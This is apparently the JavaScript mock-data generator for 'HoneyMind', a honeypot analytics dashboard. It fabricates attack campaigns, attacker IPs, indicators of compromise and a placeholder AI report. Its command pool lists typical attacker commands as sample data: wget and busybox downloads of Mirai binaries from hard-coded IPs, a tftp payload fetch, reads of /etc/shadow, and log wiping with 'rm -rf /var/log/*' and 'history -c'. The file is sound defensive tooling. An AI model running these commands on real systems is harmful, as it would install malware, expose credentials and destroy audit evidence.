/* HoneyMind — mock dataset (style logs Cowrie/honeypot)
   Données fictives mais structurées pour être remplacées par de vraies données.
   Tout est généré de façon déterministe (RNG seedé) pour rester stable. */

(function () {
  // --- RNG déterministe (mulberry32) ---
  function mulberry32(a) {
    return function () {
      a |= 0; a = (a + 0x6D2B79F5) | 0;
      let t = Math.imul(a ^ (a >>> 15), 1 | a);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }
  function pick(rng, arr) { return arr[Math.floor(rng() * arr.length)]; }
  function rint(rng, lo, hi) { return Math.floor(rng() * (hi - lo + 1)) + lo; }
  function hex(rng, n) {
    let s = ''; const c = '0123456789abcdef';
    for (let i = 0; i < n; i++) s += c[Math.floor(rng() * 16)];
    return s;
  }

  // --- Pays + géolocalisation approximative (lat, lon) ---
  const COUNTRIES = [
    { name: 'Chine',        code: 'CN', lat: 35,  lon: 105 },
    { name: 'Russie',       code: 'RU', lat: 60,  lon: 90 },
    { name: 'États-Unis',   code: 'US', lat: 38,  lon: -97 },
    { name: 'Brésil',       code: 'BR', lat: -10, lon: -52 },
    { name: 'Inde',         code: 'IN', lat: 22,  lon: 78 },
    { name: 'Pays-Bas',     code: 'NL', lat: 52,  lon: 5 },
    { name: 'Allemagne',    code: 'DE', lat: 51,  lon: 10 },
    { name: 'Vietnam',      code: 'VN', lat: 16,  lon: 107 },
    { name: 'Indonésie',    code: 'ID', lat: -2,  lon: 118 },
    { name: 'Roumanie',     code: 'RO', lat: 46,  lon: 25 },
    { name: 'France',       code: 'FR', lat: 46,  lon: 2 },
    { name: 'Corée du Sud', code: 'KR', lat: 36,  lon: 128 },
    { name: 'Iran',         code: 'IR', lat: 32,  lon: 53 },
    { name: 'Ukraine',      code: 'UA', lat: 49,  lon: 32 },
    { name: 'Nigéria',      code: 'NG', lat: 9,   lon: 8 },
    { name: 'Turquie',      code: 'TR', lat: 39,  lon: 35 },
    { name: 'Mexique',      code: 'MX', lat: 23,  lon: -102 },
    { name: 'Argentine',    code: 'AR', lat: -34, lon: -64 },
    { name: 'Japon',        code: 'JP', lat: 36,  lon: 138 },
    { name: 'Afrique du Sud', code: 'ZA', lat: -29, lon: 24 },
    { name: 'Singapour',    code: 'SG', lat: 1,   lon: 104 },
    { name: 'Pologne',      code: 'PL', lat: 52,  lon: 19 },
  ];
  // Poids : certains pays attaquent beaucoup plus (réalisme)
  const WEIGHTS = { CN: 9, RU: 8, US: 6, BR: 5, IN: 5, VN: 4, NL: 4, DE: 3, ID: 3, RO: 3, IR: 3, UA: 2, KR: 2, FR: 2, NG: 2, TR: 2, MX: 1, AR: 1, JP: 1, ZA: 1, SG: 2, PL: 1 };
  const WEIGHTED = [];
  COUNTRIES.forEach(c => { for (let i = 0; i < (WEIGHTS[c.code] || 1); i++) WEIGHTED.push(c); });

  // --- Pools de commandes (typiques honeypot SSH/Telnet) ---
  const COMMANDS = [
    'uname -a', 'cat /proc/cpuinfo', 'whoami', 'ls -la /', 'cat /etc/passwd',
    'cat /etc/shadow', 'ps aux', 'free -m', 'nproc', 'cd /tmp', 'cd /var/run',
    'chmod +x .x', './.x', 'rm -rf /var/log/*', 'history -c', 'crontab -l',
    'wget http://45.227.255.190/bins.sh', 'curl -O http://193.142.146.35/arm7',
    'busybox wget http://185.244.25.150/mirai.x86', 'tftp -g 91.92.240.12 -r m.bin',
    'echo -e "root\\nroot" | passwd', 'cat /proc/mounts', 'mount', 'lscpu',
    'enable\nsystem\nshell\nsh', '/bin/busybox MIRAI', 'cat /bin/echo',
    'scp dropper.elf /tmp', 'dd if=/dev/zero of=/dev/null',
  ];
  const COMMAND_LABELS = [ // pour le top commandes agrégé
    'busybox wget', 'cat /etc/passwd', 'uname -a', 'chmod +x', 'wget (dropper)',
    '/bin/busybox MIRAI', 'rm -rf /var/log', 'cat /proc/cpuinfo', 'crontab -l', 'curl -O',
  ];

  // --- Pools IOC ---
  const DOMAINS = ['bins.dropme.ru', 'cdn-update.xyz', 'mirai-loader.top', 'sshscan.io',
    'load.botnet-c2.cc', 'pool.cryptojack.net', 'update-server.su', 'r3lay.onion-host.org'];

  function makeIp(rng) {
    return `${rint(rng, 41, 223)}.${rint(rng, 0, 255)}.${rint(rng, 0, 255)}.${rint(rng, 1, 254)}`;
  }
  function makeUrl(rng) {
    return `http://${rint(rng, 41, 223)}.${rint(rng, 0, 255)}.${rint(rng, 0, 255)}.${rint(rng, 1, 254)}/${pick(rng, ['bins.sh', 'arm7', 'x86', 'mirai.x86', 'loader', 'update.bin'])}`;
  }

  // --- Génération d'une campagne ---
  const CAMPAIGN_NAMES = [
    'Vague SSH brute-force', 'Déploiement Mirai', 'Scan Telnet massif',
    'Cryptojacking opportuniste', 'Reconnaissance ciblée', 'Dropper ELF ARM',
    'Exploitation CVE-2024', 'Botnet recruitment',
  ];

  function genCampaign(seed, index) {
    const rng = mulberry32(seed);
    const nIps = rint(rng, 6, 34);
    const ips = [];
    const usedIp = new Set();
    for (let i = 0; i < nIps; i++) {
      let ip = makeIp(rng);
      while (usedIp.has(ip)) ip = makeIp(rng);
      usedIp.add(ip);
      const country = pick(rng, WEIGHTED);
      const connections = rint(rng, 3, 280);
      const success = Math.min(connections, rint(rng, 0, Math.ceil(connections * 0.35)));
      const commandsCount = success > 0 ? rint(rng, 0, 60) : 0;
      const cmds = [];
      for (let k = 0; k < Math.min(commandsCount, 8); k++) cmds.push(pick(rng, COMMANDS));
      ips.push({
        ip,
        country: country.name, code: country.code,
        lat: country.lat + (rng() - 0.5) * 12,
        lon: country.lon + (rng() - 0.5) * 16,
        connections, success, commands: commandsCount,
        sampleCommands: cmds,
        asn: 'AS' + rint(rng, 4000, 65000),
        org: pick(rng, ['Hosting LLC', 'Cloud Provider', 'Telecom ISP', 'Datacenter Inc', 'VPS Networks', 'Broadband ISP']),
        firstSeen: '2026-0' + rint(rng, 1, 5) + '-' + String(rint(rng, 10, 28)).padStart(2, '0'),
      });
    }
    ips.sort((a, b) => b.connections - a.connections);

    const connectionAttempts = ips.reduce((s, x) => s + x.connections, 0);
    const successfulConnections = ips.reduce((s, x) => s + x.success, 0);
    const commandsRun = ips.reduce((s, x) => s + x.commands, 0);
    const filesTransferred = rint(rng, 0, Math.ceil(commandsRun / 12));

    // IOC
    const iocIps = ips.slice(0, Math.min(6, ips.length)).map(x => x.ip);
    const nDom = rint(rng, 1, 4), nUrl = rint(rng, 1, 4), nHash = rint(rng, 1, 5);
    const domains = [], urls = [], hashes = [];
    for (let i = 0; i < nDom; i++) domains.push(pick(rng, DOMAINS));
    for (let i = 0; i < nUrl; i++) urls.push(makeUrl(rng));
    for (let i = 0; i < nHash; i++) hashes.push(hex(rng, 64));

    const startDay = rint(rng, 1, 24);
    const len = rint(rng, 2, 9);
    const id = 'CAMP-2026-' + String(index + 1).padStart(3, '0');
    const status = index < 3 ? 'active' : (rng() > 0.5 ? 'clôturée' : 'archivée');

    return {
      id,
      name: CAMPAIGN_NAMES[index % CAMPAIGN_NAMES.length],
      status,
      start: `2026-05-${String(startDay).padStart(2, '0')}`,
      end: `2026-05-${String(Math.min(28, startDay + len)).padStart(2, '0')}`,
      attackingIps: nIps,
      connectionAttempts,
      successfulConnections,
      commandsRun,
      filesTransferred,
      ips,
      ioc: { ips: [...new Set(iocIps)], domains: [...new Set(domains)], urls: [...new Set(urls)], hashes },
      severity: connectionAttempts > 2500 ? 'critique' : connectionAttempts > 1200 ? 'élevée' : connectionAttempts > 400 ? 'moyenne' : 'faible',
    };
  }

  const campaigns = [];
  for (let i = 0; i < 8; i++) campaigns.push(genCampaign(1000 + i * 7, i));

  // --- Agrégats dashboard ---
  const allIps = campaigns.flatMap(c => c.ips);
  const uniqueIpSet = new Set(allIps.map(x => x.ip));
  const totalAttacks = campaigns.reduce((s, c) => s + c.connectionAttempts, 0);
  const totalCommands = campaigns.reduce((s, c) => s + c.commandsRun, 0);
  const activeCampaigns = campaigns.filter(c => c.status === 'active').length;

  // Top pays
  const byCountry = {};
  allIps.forEach(x => {
    byCountry[x.code] = byCountry[x.code] || { code: x.code, name: x.country, attacks: 0, ips: 0 };
    byCountry[x.code].attacks += x.connections;
    byCountry[x.code].ips += 1;
  });
  const topCountries = Object.values(byCountry).sort((a, b) => b.attacks - a.attacks).slice(0, 8);

  // Top commandes (déterministe)
  const rngC = mulberry32(424242);
  const topCommands = COMMAND_LABELS.map(label => ({ label, count: rint(rngC, 120, 1800) }))
    .sort((a, b) => b.count - a.count);

  // Série temporelle 30 jours
  const rngT = mulberry32(99);
  const timeseries = [];
  for (let d = 0; d < 30; d++) {
    const base = 200 + Math.sin(d / 3) * 90 + d * 6;
    timeseries.push({ day: d + 1, attacks: Math.max(20, Math.round(base + (rngT() - 0.5) * 160)) });
  }

  // Points carte dashboard (échantillon agrégé par IP)
  const mapPoints = allIps.map(x => ({
    ip: x.ip, lat: x.lat, lon: x.lon, weight: x.connections, country: x.country,
  }));

  // --- Carte du monde : matrice de points (équirectangulaire) ---
  // landRanges[row] = liste de [colStart, colEnd]. Largeur 72, hauteur 36.
  // lon -180..180 (5°/col) ; lat 84..-60 (4°/row).
  const MAP_W = 72, MAP_H = 36;
  const MAP_LAT_TOP = 84, MAP_LAT_BOT = -60;
  const landRanges = {
    1: [[28, 31]],
    2: [[10, 14], [27, 32]],
    3: [[8, 16], [27, 33], [44, 52]],
    4: [[6, 24], [27, 32], [40, 68]],
    5: [[4, 9], [10, 25], [37, 42], [44, 70]],
    6: [[5, 24], [26, 30], [34, 44], [46, 70]],
    7: [[6, 23], [33, 45], [47, 70]],
    8: [[8, 22], [33, 46], [48, 69]],
    9: [[10, 22], [33, 46], [50, 68]],
    10: [[11, 21], [34, 38], [40, 46], [52, 66]],
    11: [[12, 21], [35, 38], [40, 47], [52, 66]],
    12: [[13, 20], [33, 47], [52, 64], [63, 65]],
    13: [[14, 19], [32, 48], [50, 54], [55, 63]],
    14: [[15, 18], [32, 47], [50, 54], [56, 60]],
    15: [[16, 18], [32, 46], [50, 54]],
    16: [[17, 19], [33, 45], [51, 54]],
    17: [[18, 20], [33, 44], [55, 58]],
    18: [[19, 28], [34, 44], [56, 60]],
    19: [[20, 29], [35, 44], [57, 62]],
    20: [[20, 29], [36, 44], [57, 64]],
    21: [[20, 29], [37, 43], [58, 64]],
    22: [[21, 29], [37, 43], [59, 63]],
    23: [[21, 28], [38, 43], [59, 67]],
    24: [[21, 28], [38, 43], [60, 67]],
    25: [[22, 27], [38, 43], [59, 67]],
    26: [[22, 27], [38, 43], [59, 67]],
    27: [[23, 26], [39, 43], [59, 66]],
    28: [[23, 26], [39, 42], [60, 66]],
    29: [[23, 25], [39, 42], [61, 65]],
    30: [[23, 25], [62, 64]],
    31: [[23, 25]],
    32: [[23, 24]],
    33: [[23, 24]],
    34: [[24, 24]],
  };
  function isLand(row, col) {
    const ranges = landRanges[row];
    if (!ranges) return false;
    return ranges.some(([a, b]) => col >= a && col <= b);
  }
  // projection lat/lon -> pourcentage dans la carte
  function project(lat, lon) {
    const x = ((lon + 180) / 360) * 100;
    const y = ((MAP_LAT_TOP - lat) / (MAP_LAT_TOP - MAP_LAT_BOT)) * 100;
    return { x: Math.max(0, Math.min(100, x)), y: Math.max(0, Math.min(100, y)) };
  }

  // --- Résumé IA (markdown placeholder) ---
  function aiSummaryMd(c) {
    const top = c.ips.slice(0, 3);
    return `# Analyse IA — ${c.id}

> _Synthèse générée automatiquement par le module d'analyse HoneyMind. Cette zone affichera le rapport \`.md\` produit par l'IA._

## Vue d'ensemble
La campagne **${c.name}** a mobilisé **${c.attackingIps} adresses IP** distinctes sur la période du **${c.start}** au **${c.end}**, totalisant **${c.connectionAttempts.toLocaleString('fr-FR')} tentatives** de connexion dont **${c.successfulConnections.toLocaleString('fr-FR')} réussies**. Niveau de sévérité estimé : **${c.severity}**.

## Comportement observé
Les sessions présentent un schéma cohérent avec une activité de type **botnet automatisé** :

- Reconnaissance système (\`uname -a\`, \`cat /proc/cpuinfo\`)
- Tentative de téléchargement de charge utile via \`wget\`/\`busybox\`
- Persistance et nettoyage de traces (\`history -c\`, \`rm -rf /var/log/*\`)

## Acteurs principaux
${top.map((t, i) => `${i + 1}. \`${t.ip}\` — ${t.country} · ${t.connections} connexions · ${t.commands} commandes`).join('\n')}

## Recommandations
- Bloquer les plages IP listées dans les IOC ci-contre.
- Surveiller les hash SHA-256 des charges utiles sur le parc.
- Corréler avec les flux de threat intelligence externes.

\`\`\`
# Statut du module IA : en attente du rapport définitif
# Le contenu ci-dessus est un aperçu de mise en forme.
\`\`\``;
  }
  campaigns.forEach(c => { c.aiSummary = aiSummaryMd(c); });

  // --- Mini moteur markdown -> HTML (titres, gras, listes, code, citations) ---
  function mdToHtml(md) {
    const esc = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const lines = md.split('\n');
    let html = '', inUl = false, inOl = false, inCode = false;
    const closeLists = () => {
      if (inUl) { html += '</ul>'; inUl = false; }
      if (inOl) { html += '</ol>'; inOl = false; }
    };
    const inline = t => esc(t)
      .replace(/`([^`]+)`/g, '<code>$1</code>')
      .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
      .replace(/_([^_]+)_/g, '<em>$1</em>');
    for (let raw of lines) {
      if (raw.trim().startsWith('```')) {
        if (!inCode) { closeLists(); html += '<pre><code>'; inCode = true; }
        else { html += '</code></pre>'; inCode = false; }
        continue;
      }
      if (inCode) { html += esc(raw) + '\n'; continue; }
      const line = raw.trim();
      if (line === '') { closeLists(); continue; }
      if (line.startsWith('### ')) { closeLists(); html += `<h3>${inline(line.slice(4))}</h3>`; continue; }
      if (line.startsWith('## ')) { closeLists(); html += `<h2>${inline(line.slice(3))}</h2>`; continue; }
      if (line.startsWith('# ')) { closeLists(); html += `<h1>${inline(line.slice(2))}</h1>`; continue; }
      if (line.startsWith('> ')) { closeLists(); html += `<blockquote>${inline(line.slice(2))}</blockquote>`; continue; }
      if (/^[-*] /.test(line)) {
        if (!inUl) { closeLists(); html += '<ul>'; inUl = true; }
        html += `<li>${inline(line.slice(2))}</li>`; continue;
      }
      if (/^\d+\. /.test(line)) {
        if (!inOl) { closeLists(); html += '<ol>'; inOl = true; }
        html += `<li>${inline(line.replace(/^\d+\.\s/, ''))}</li>`; continue;
      }
      closeLists();
      html += `<p>${inline(line)}</p>`;
    }
    closeLists();
    if (inCode) html += '</code></pre>';
    return html;
  }

  window.HM_DATA = {
    campaigns,
    stats: {
      totalAttacks, uniqueIps: uniqueIpSet.size, activeCampaigns,
      totalCommands, totalCampaigns: campaigns.length,
      filesTransferred: campaigns.reduce((s, c) => s + c.filesTransferred, 0),
    },
    topCountries, topCommands, timeseries, mapPoints,
    map: { W: MAP_W, H: MAP_H, isLand, project },
    mdToHtml,
    vtIpUrl: ip => `https://www.virustotal.com/gui/ip-address/${ip}`,
    vtHashUrl: h => `https://www.virustotal.com/gui/file/${h}`,
    vtDomainUrl: d => `https://www.virustotal.com/gui/domain/${d}`,
  };
})();
